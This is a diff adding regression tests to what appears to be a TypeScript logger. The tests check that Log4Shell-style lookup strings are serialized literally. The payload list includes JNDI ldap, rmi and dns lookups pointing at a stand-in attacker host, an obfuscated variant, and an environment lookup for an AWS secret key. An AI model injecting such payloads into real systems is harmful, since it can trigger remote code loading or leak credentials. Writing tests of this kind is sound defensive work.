@@ -79,6 +79,53 @@ test("createLogger child inherits redaction config", () => {
   assert.equal(obj.requestId, "r1");
 });
 
+// Log4Shell-class regression: the default logger MUST NOT perform any
+// kind of lookup / interpolation / expression evaluation on logged
+// values. Untrusted strings like `${jndi:ldap://attacker/x}` that an
+// attacker plants in a User-Agent / header / body field and that user
+// code passes into a log call must be serialized literally — not
+// resolved against a JNDI provider, not handed to a format-string
+// expander, not run through `util.format`. See the Snyk Log4Shell
+// remediation write-up (https://snyk.io/blog/liveramp-used-snyk-to-remediate-log4shell/).
+test("createLogger serializes JNDI / lookup payloads literally (Log4Shell-class)", () => {
+  const lines: string[] = [];
+  const log = createLogger({ level: "info", write: (l) => lines.push(l) });
+  const payloads = [
+    "${jndi:ldap://attacker.example/x}",
+    "${jndi:rmi://attacker.example/y}",
+    "${jndi:dns://attacker.example/z}",
+    "${${lower:j}ndi:ldap://attacker.example/q}",
+    "${env:AWS_SECRET_ACCESS_KEY}",
+    "${sys:user.home}",
+    "%s %d %j ${0} {{7*7}} #{1+1}",
+  ];
+  for (const p of payloads) {
+    log.info({ userAgent: p, nested: { header: p }, list: [p] }, p);
+  }
+  assert.equal(lines.length, payloads.length);
+  for (let i = 0; i < payloads.length; i++) {
+    const raw = lines[i]!;
+    const obj = JSON.parse(raw);
+    // Every position must contain the payload verbatim.
+    assert.equal(obj.msg, payloads[i]);
+    assert.equal(obj.userAgent, payloads[i]);
+    assert.equal(obj.nested.header, payloads[i]);
+    assert.deepEqual(obj.list, [payloads[i]]);
+    // And the on-wire form must not have been mutated (no lookup
+    // resolved to a real value, no format token replaced).
+    assert.ok(raw.includes(JSON.stringify(payloads[i])));
+  }
+});
+
+test("createLogger does not expand lookup-shaped object keys", () => {
+  const lines: string[] = [];
+  const log = createLogger({ level: "info", write: (l) => lines.push(l) });
+  const key = "${jndi:ldap://attacker.example/k}";
+  log.info({ [key]: "v" });
+  const obj = JSON.parse(lines[0]!);
+  assert.equal(obj[key], "v");
+});
+
 test("DEFAULT_REDACT_KEYS includes the documented set", () => {
   for (const k of ["authorization", "cookie", "set-cookie", "password", "token"]) {
     assert.ok(DEFAULT_REDACT_KEYS.includes(k));
